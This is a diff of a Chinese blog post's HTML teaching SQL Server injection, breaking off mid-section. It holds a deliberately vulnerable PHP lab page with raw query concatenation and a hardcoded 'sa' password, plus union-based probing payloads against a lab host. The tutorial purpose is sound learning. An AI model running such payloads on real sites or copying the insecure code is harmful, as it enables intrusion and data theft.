@@ -3,14 +3,28 @@
 <head>
   <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<meta name="theme-color" content="#f7f7f4">
-<meta name="color-scheme" content="light">
+<meta name="color-scheme" content="light dark">
+<meta name="theme-color" content="#f7f7f4" data-theme-color-light="#f7f7f4" data-theme-color-dark="#161614">
 
 <title>基于SqlServer的SQL注入 — CurlySean&#39;s Blog</title>
 <meta name="description" content="这里是 CurlySean 的个人技术博客，记录漏洞研究、代码审计与攻防实践，整理可以复现、验证与继续推演的技术细节。">
-<link rel="canonical" href="http://curlysean.github.io/2025/08/14/%E5%9F%BA%E4%BA%8ESqlServer%E7%9A%84SQL%E6%B3%A8%E5%85%A5/">
+<link rel="canonical" href="https://curlysean.github.io/2025/08/14/%E5%9F%BA%E4%BA%8ESqlServer%E7%9A%84SQL%E6%B3%A8%E5%85%A5/">
+<link rel="preload" href="/fonts/instrument-sans-latin-wght-normal.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/jetbrains-mono-latin-wght-normal.woff2" as="font" type="font/woff2" crossorigin>
 <link rel="stylesheet" href="/css/style.css">
-<script>document.documentElement.classList.add('js')</script>
+<script>
+  (function () {
+    try {
+      var key = 'sheepfold-theme';
+      var saved = localStorage.getItem(key);
+      var dark = saved === 'dark' || (saved !== 'light' && window.matchMedia('(prefers-color-scheme: dark)').matches);
+      document.documentElement.setAttribute('data-theme', dark ? 'dark' : 'light');
+      document.documentElement.classList.add('js');
+    } catch (error) {
+      document.documentElement.classList.add('js');
+    }
+  })();
+</script>
 
 <meta name="generator" content="Hexo 7.3.0"></head>
 <body class="page-type-post">
@@ -37,11 +51,18 @@
         <a class="desktop-nav__link" href="/about/">关于</a>
       
     </nav>
-    <a class="header-cta" href="/archives/">开始阅读 <span aria-hidden="true">↗</span></a>
-    <button class="menu-toggle" type="button" aria-expanded="false" aria-controls="mobile-menu" data-menu-toggle>
-      <span class="sr-only">打开导航</span>
-      <span></span><span></span>
-    </button>
+    <div class="site-header__actions">
+      <button class="theme-toggle" type="button" data-theme-toggle aria-label="切换颜色模式" title="切换颜色模式">
+        <span data-theme-toggle-label>暗色</span>
+      </button>
+      
+        <a class="header-cta header-cta--ghost" href="/archives/">全部文章 <span aria-hidden="true">↗</span></a>
+      
+      <button class="menu-toggle" type="button" aria-expanded="false" aria-controls="mobile-menu" data-menu-toggle>
+        <span class="sr-only">打开导航</span>
+        <span></span><span></span>
+      </button>
+    </div>
   </div>
   <nav class="mobile-nav" id="mobile-menu" aria-label="移动端主导航" data-mobile-menu>
     <div class="frame mobile-nav__inner">
@@ -90,12 +111,6 @@
         
       </div>
     </div>
-    <div class="frame post-meta-grid reveal">
-      <div><span>发布</span><time datetime="2025-08-14T06:01:32.000Z">2025.08.14</time></div>
-      <div><span>更新</span><time datetime="2025-08-14T06:01:32.000Z">2025.08.14</time></div>
-      <div><span>阅读</span><strong>27 MIN</strong></div>
-      <div><span>标签</span><strong>1</strong></div>
-    </div>
   </header>
 
   <div class="frame post-content-layout">
@@ -103,13 +118,19 @@
       <div class="post-rail__inner">
         <p class="eyebrow">ON THIS PAGE</p>
         
-          <nav class="toc" aria-label="文章目录"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Ie5J5"><span class="toc-text">基于SqlServer的SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#YBV7G"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#o2JTT"><span class="toc-text">SqlServer搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#vucaF"><span class="toc-text">SqlServer基础</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ZNxWD"><span class="toc-text">默认数据库</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#kL0Os"><span class="toc-text">系统数据库：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#qWTUS"><span class="toc-text">实例数据库：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#VGws7"><span class="toc-text">数据库的组成</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#cgnEs"><span class="toc-text">文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Eo4Ms"><span class="toc-text">文件组</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#x8Cvj"><span class="toc-text">设计原则</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cm4QN"><span class="toc-text">SqlServer权限</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ybo2c"><span class="toc-text">T-SQL语言</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#dfWqj"><span class="toc-text">创建数据库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#waUGu"><span class="toc-text">创建表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bGBmK"><span class="toc-text">增删改查</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Ece5h"><span class="toc-text">插入数据</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#TGGaN"><span class="toc-text">删除数据</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Xbebe"><span class="toc-text">修改数据</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#egPq9"><span class="toc-text">查询数据</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#X0Ppb"><span class="toc-text">SqlServer手工注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#qdFxg"><span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#lZpDf"><span class="toc-text">常见注入函数和关键字</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HZao5"><span class="toc-text">注入手法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#JU1ft"><span class="toc-text">联合查询</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pnSUl"><span class="toc-text">报错注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#IeAWT"><span class="toc-text">布尔盲注</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#KxKAK"><span class="toc-text">延时注入</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#zxVml"><span class="toc-text">SqlServer命令执行</span></a></li></ol></li></ol></nav>
+          <nav class="toc" aria-label="文章目录"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#YBV7G"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#o2JTT"><span class="toc-text">SqlServer搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#vucaF"><span class="toc-text">SqlServer基础</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ZNxWD"><span class="toc-text">默认数据库</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#kL0Os"><span class="toc-text">系统数据库：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#qWTUS"><span class="toc-text">实例数据库：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#VGws7"><span class="toc-text">数据库的组成</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#cgnEs"><span class="toc-text">文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Eo4Ms"><span class="toc-text">文件组</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#x8Cvj"><span class="toc-text">设计原则</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cm4QN"><span class="toc-text">SqlServer权限</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ybo2c"><span class="toc-text">T-SQL语言</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#dfWqj"><span class="toc-text">创建数据库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#waUGu"><span class="toc-text">创建表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bGBmK"><span class="toc-text">增删改查</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Ece5h"><span class="toc-text">插入数据</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#TGGaN"><span class="toc-text">删除数据</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Xbebe"><span class="toc-text">修改数据</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#egPq9"><span class="toc-text">查询数据</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#X0Ppb"><span class="toc-text">SqlServer手工注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#qdFxg"><span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#lZpDf"><span class="toc-text">常见注入函数和关键字</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HZao5"><span class="toc-text">注入手法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#JU1ft"><span class="toc-text">联合查询</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pnSUl"><span class="toc-text">报错注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#IeAWT"><span class="toc-text">布尔盲注</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#KxKAK"><span class="toc-text">延时注入</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#zxVml"><span class="toc-text">SqlServer命令执行</span></a></li></ol></nav>
         
       </div>
     </aside>
     <div class="article-column">
+      <div class="post-meta-grid reveal">
+        <div><span>发布</span><time datetime="2025-08-14T06:01:32.000Z">2025.08.14</time></div>
+        <div><span>更新</span><time datetime="2025-08-14T06:01:32.000Z">2025.08.14</time></div>
+        <div><span>阅读</span><strong>约 13 分钟</strong></div>
+        <div><span>标签</span><strong>1</strong></div>
+      </div>
       <div class="article-body">
-        <h1 id="Ie5J5">基于SqlServer的SQL注入</h1>
+        
 <h2 id="YBV7G">前言</h2>
 
 <p>最近面试了几家实习，都问了基于SqlServer的SQL注入，所以今天想补一下基础。</p>
@@ -191,32 +212,32 @@
 <p>如果希望对数据库的文件路径、大小、增长方式等进行配置，可以使用以下命令</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">CREATE DATABASE SQLDB</span><br><span class="line">ON <span class="title function_">PRIMARY</span> <span class="params">(</span></span><br><span class="line"><span class="params">    NAME = SQLDB_data,</span></span><br><span class="line"><span class="params">    FILENAME = <span class="string">&#x27;C:\MSSQL\DATA\SQLDB_data.mdf&#x27;</span>,</span></span><br><span class="line"><span class="params">    SIZE = 10MB,</span></span><br><span class="line"><span class="params">    MAXSIZE = 100MB,</span></span><br><span class="line"><span class="params">    FILEGROWTH = 5MB</span></span><br><span class="line"><span class="params">)</span></span><br><span class="line">LOG <span class="title function_">ON</span> <span class="params">(</span></span><br><span class="line"><span class="params">    NAME = SQLDB_log,</span></span><br><span class="line"><span class="params">    FILENAME = <span class="string">&#x27;C:\MSSQL\DATA\SQLDB_log.ldf&#x27;</span>,</span></span><br><span class="line"><span class="params">    SIZE = 5MB,</span></span><br><span class="line"><span class="params">    MAXSIZE = 50MB,</span></span><br><span class="line"><span class="params">    FILEGROWTH = 5MB</span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749273823298-089e8d08-ccaa-49dc-82f8-17a60af1f3bc.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749273823298-089e8d08-ccaa-49dc-82f8-17a60af1f3bc.png" alt="基于SqlServer的SQL注入" loading="lazy"></p>
 <h3 id="waUGu">创建表</h3>
 
 <p>用T-SQL在SQLDB中新建表，新建表的时候要同时指明字段信息</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">-- 切换到 SQLDB 数据库</span><br><span class="line">USE SQLDB;</span><br><span class="line">GO</span><br><span class="line"></span><br><span class="line">-- 创建一个名为 Employees 的表</span><br><span class="line">CREATE TABLE <span class="title function_">Employees</span> <span class="params">(</span></span><br><span class="line"><span class="params">    EmployeeID INT PRIMARY KEY IDENTITY(<span class="number">1</span>,<span class="number">1</span>)</span>,  -- 员工ID，主键，自增</span><br><span class="line">    FirstName <span class="title function_">NVARCHAR</span><span class="params">(<span class="number">50</span>)</span> NOT NULL,           -- 名，最大<span class="number">50</span>字符，不能为空</span><br><span class="line">    LastName <span class="title function_">NVARCHAR</span><span class="params">(<span class="number">50</span>)</span> NOT NULL,            -- 姓，最大<span class="number">50</span>字符，不能为空</span><br><span class="line">    BirthDate DATE NULL,                       -- 出生日期，可以为空</span><br><span class="line">    HireDate DATE NOT NULL,                    -- 入职日期，不能为空</span><br><span class="line">    Email <span class="title function_">NVARCHAR</span><span class="params">(<span class="number">100</span>)</span> UNIQUE,                -- 邮箱，唯一约束，可为空</span><br><span class="line">    Salary <span class="title function_">DECIMAL</span><span class="params">(<span class="number">10</span>, <span class="number">2</span>)</span> CHECK (Salary &gt;= <span class="number">0</span>)  -- 工资，保留两位小数，必须为非负数</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749274154500-0fbfc9ac-df90-4df4-a735-d3905eef6611.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749274154500-0fbfc9ac-df90-4df4-a735-d3905eef6611.png" alt="基于SqlServer的SQL注入" loading="lazy"></p>
 <h3 id="bGBmK">增删改查</h3>
 <h4 id="Ece5h">插入数据</h4>
 
 <p>使用Insert向该表中插入数据，可以使用以下命令：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">-- 切换到 SQLDB 数据库</span><br><span class="line">USE SQLDB;</span><br><span class="line">GO</span><br><span class="line"></span><br><span class="line">-- 向 Employees 表插入一条记录（不包括自增主键 EmployeeID）</span><br><span class="line">INSERT INTO <span class="title function_">Employees</span> <span class="params">(FirstName, LastName, BirthDate, HireDate, Email, Salary)</span></span><br><span class="line">VALUES (</span><br><span class="line">    <span class="string">&#x27;John&#x27;</span>,                -- FirstName</span><br><span class="line">    <span class="string">&#x27;Doe&#x27;</span>,                 -- LastName</span><br><span class="line">    <span class="string">&#x27;1985-06-15&#x27;</span>,          -- BirthDate</span><br><span class="line">    <span class="string">&#x27;2020-01-10&#x27;</span>,          -- HireDate</span><br><span class="line">    <span class="string">&#x27;john.doe@example.com&#x27;</span>,-- Email</span><br><span class="line">    <span class="number">5500.00</span>                -- Salary</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749274430512-4d8c38c1-16bd-419b-9239-7e71cb1cf558.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749274430512-4d8c38c1-16bd-419b-9239-7e71cb1cf558.png" alt="基于SqlServer的SQL注入" loading="lazy"></p>
 <h4 id="TGGaN">删除数据</h4>
 
 <p>使用DELETE删除名为John Doe的员工，命令如下</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-- 删除名为 John Doe 的员工</span><br><span class="line">DELETE FROM Employees</span><br><span class="line"><span class="type">WHERE</span> <span class="variable">FirstName</span> <span class="operator">=</span> <span class="string">&#x27;John&#x27;</span> <span class="type">AND</span> <span class="variable">LastName</span> <span class="operator">=</span> <span class="string">&#x27;Doe&#x27;</span>;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749274538213-7a61e8f0-f9b1-42fa-980e-0d0034267d3e.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749274538213-7a61e8f0-f9b1-42fa-980e-0d0034267d3e.png" alt="基于SqlServer的SQL注入" loading="lazy"></p>
 <h4 id="Xbebe">修改数据</h4>
 
 <p>修改名为Sean Doe的员工的薪资，修改为<code>6000.00</code></p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-- 修改名为 Sean Doe 的员工薪资为 <span class="number">6000.00</span></span><br><span class="line">UPDATE Employees</span><br><span class="line"><span class="type">SET</span> <span class="variable">Salary</span> <span class="operator">=</span> <span class="number">6000.00</span></span><br><span class="line"><span class="type">WHERE</span> <span class="variable">FirstName</span> <span class="operator">=</span> <span class="string">&#x27;Sean&#x27;</span> <span class="type">AND</span> <span class="variable">LastName</span> <span class="operator">=</span> <span class="string">&#x27;Doe&#x27;</span>;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749274637417-9a73bfad-551d-49c6-a02a-9ea4a55cfd8d.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749274637417-9a73bfad-551d-49c6-a02a-9ea4a55cfd8d.png" alt="基于SqlServer的SQL注入" loading="lazy"></p>
 <h4 id="egPq9">查询数据</h4>
 
 <p>查询数据的所使用的语句基本结构如下</p>
@@ -226,7 +247,7 @@
 <p>这里我们举个例子，可以使用以下 T-SQL 语句来查询名为 Sean Doe 的员工的邮箱和薪资信息</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT Email, Salary</span><br><span class="line">FROM Employees</span><br><span class="line"><span class="type">WHERE</span> <span class="variable">FirstName</span> <span class="operator">=</span> <span class="string">&#x27;Sean&#x27;</span> <span class="type">AND</span> <span class="variable">LastName</span> <span class="operator">=</span> <span class="string">&#x27;Doe&#x27;</span>;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749274859375-1b2cfc38-dada-475c-9c7a-56c66ee3b16c.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749274859375-1b2cfc38-dada-475c-9c7a-56c66ee3b16c.png" alt="基于SqlServer的SQL注入" loading="lazy"></p>
 <h2 id="X0Ppb">SqlServer手工注入</h2>
 
 <p>MSSQL注入攻击是最为复杂的数据库攻击技术，由于该数据库的功能十分强大，存储过程以及函数语句十分丰富，这些灵活的语句造就了新颖的攻击思路。</p>
@@ -250,19 +271,19 @@
 
 <p>需要在phpstudy中添加sqlsrv扩展，下载链接<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/sql/connect/php/release-notes-php-sql-driver?view=sql-server-ver15#previous-releases">https://learn.microsoft.com/en-us/sql/connect/php/release-notes-php-sql-driver?view=sql-server-ver15#previous-releases</a></p>
 <p>因为我这里是php7.3.4版本，我们需要将这两个文件放到<code>C:\phpstudy_pro\Extensions\php\php7.3.4nts\ext</code>目录下</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749278764229-24daed4b-4130-40f2-ba42-c3e5aa3a7181.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749278764229-24daed4b-4130-40f2-ba42-c3e5aa3a7181.png" alt="基于SqlServer的SQL注入" loading="lazy"></p>
 <p>并在php.ini文件中添加这两行配置</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">extension=php_sqlsrv_63_nts.dll</span><br><span class="line">extension=php_pdo_sqlsrv_73_nts.dll</span><br></pre></td></tr></table></figure>
 
 <p>进入phpinfo界面后，可以看到我们的sqlsrv扩展就已经配置好了</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749279018263-2dfcd35e-23eb-4c24-8a63-ec895ad57e94.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749279018263-2dfcd35e-23eb-4c24-8a63-ec895ad57e94.png" alt="基于SqlServer的SQL注入" loading="lazy"></p>
 <p>除此之外，还需要去安装ODBC Driver，链接如下（64位电脑安装64位驱动即可）</p>
 <p><a target="_blank" rel="noopener" href="https://files.cnblogs.com/files/wtcl/sqlserverodbc.zip">https://files.cnblogs.com/files/wtcl/sqlserverodbc.zip</a></p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749279529839-7ee6566a-38e7-4727-87db-72943da5821a.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749279529839-7ee6566a-38e7-4727-87db-72943da5821a.png" alt="基于SqlServer的SQL注入" loading="lazy"></p>
 <p>在网站目录下，创建一个进行sql查询的php文件，源码如下：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="title function_">header</span><span class="params">(<span class="string">&quot;Content-Type:text/html;charset=gbk&quot;</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 数据库连接</span></span><br><span class="line">$conn = sqlsrv_connect(<span class="string">&#x27;127.0.0.1&#x27;</span>, array(</span><br><span class="line">    <span class="string">&#x27;Database&#x27;</span> =&gt; <span class="string">&#x27;SchoolDB&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;UID&#x27;</span> =&gt; <span class="string">&#x27;sa&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;PWD&#x27;</span> =&gt; <span class="string">&#x27;@sql123&#x27;</span></span><br><span class="line">));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 连接失败时输出错误</span></span><br><span class="line"><span class="keyword">if</span> ($conn === <span class="literal">false</span>) &#123;</span><br><span class="line">    var_dump(sqlsrv_errors());</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取 GET 参数 id（注意：这是一个注入测试场景）</span></span><br><span class="line">$id = $_GET[<span class="string">&quot;id&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 拼接 SQL 语句</span></span><br><span class="line">$sql = <span class="string">&quot;SELECT * FROM Students WHERE StudentID = $id&quot;</span>;</span><br><span class="line">echo <span class="string">&quot;SQL Server injection exercise!&lt;br/&gt;&lt;br/&gt;&quot;</span>;</span><br><span class="line">echo <span class="string">&quot;sql: &quot;</span> . $sql . <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 执行查询</span></span><br><span class="line">$result = sqlsrv_query($conn, $sql);</span><br><span class="line">var_dump(sqlsrv_errors());</span><br><span class="line">echo <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出结果</span></span><br><span class="line"><span class="keyword">if</span> ($re = sqlsrv_fetch_array($result, SQLSRV_FETCH_ASSOC)) &#123;</span><br><span class="line">    echo <span class="string">&quot;学号：&quot;</span> . $re[<span class="string">&#x27;StudentID&#x27;</span>] . <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    echo <span class="string">&quot;姓名：&quot;</span> . $re[<span class="string">&#x27;StudentName&#x27;</span>] . <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    echo <span class="string">&quot;年龄：&quot;</span> . $re[<span class="string">&#x27;Age&#x27;</span>] . <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    echo <span class="string">&quot;班级：&quot;</span> . $re[<span class="string">&#x27;Class&#x27;</span>] . <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    echo <span class="string">&quot;未找到该学生。&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p>这样环境就配置好了，访问<code>http://192.168.41.131:8080/SqlServer.php?id=101</code><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749279598408-007810b0-f16a-426a-a2e3-8b8b832a4047.png"></p>
+<p>这样环境就配置好了，访问<code>http://192.168.41.131:8080/SqlServer.php?id=101</code><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749279598408-007810b0-f16a-426a-a2e3-8b8b832a4047.png" alt="基于SqlServer的SQL注入" loading="lazy"></p>
 <h3 id="lZpDf">常见注入函数和关键字</h3>
 
 <p>以下是在SQL注入中常用的函数与关键字</p>
@@ -283,40 +304,40 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SqlServer.php?id=101 and exists(select * from sysobjects) --+</span><br></pre></td></tr></table></figure>
 
 <p>返回正常说明网站使用的数据库是MSSQL</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749280514056-1d5ed736-6607-41e8-b4c8-be5316676472.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749280514056-1d5ed736-6607-41e8-b4c8-be5316676472.png" alt="基于SqlServer的SQL注入" loading="lazy"></p>
 <p>联合注入中必要的一步就是判断字段长度，当<code>order by 4</code>回显正常，但<code>order by 5</code>报错时，表明字段长度是3</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SqlServer.php?id=101 order by 4 --+  正常</span><br><span class="line">SqlServer.php?id=101 order by 5 --+  报错</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749280632611-aafdf99b-293c-4352-97d7-583c58c60f86.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749280632611-aafdf99b-293c-4352-97d7-583c58c60f86.png" alt="基于SqlServer的SQL注入" loading="lazy"></p>
 <p>接下来就是寻找字符串的回显位置（前面select语句查询为空时，才会回显联合查询的东西）</p>
 <p>可以看到，四个回显位均可以利用（正常渗透中，回显位不固定）</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SqlServer.php?id=0 union select 1,2,3,4 --+ </span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749280830221-499a2f79-e52b-47bd-8bbe-0af4df071a1b.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749280830221-499a2f79-e52b-47bd-8bbe-0af4df071a1b.png" alt="基于SqlServer的SQL注入" loading="lazy"></p>
 <p>查询当前数据库的版本信息和名字</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SqlServer.php?id=0 union select 1,db_name(),3,@@version --+ </span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749281119355-7d4fd5ba-02ed-464c-a318-52ceeebc0ab0.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749281119355-7d4fd5ba-02ed-464c-a318-52ceeebc0ab0.png" alt="基于SqlServer的SQL注入" loading="lazy"></p>
 <blockquote>
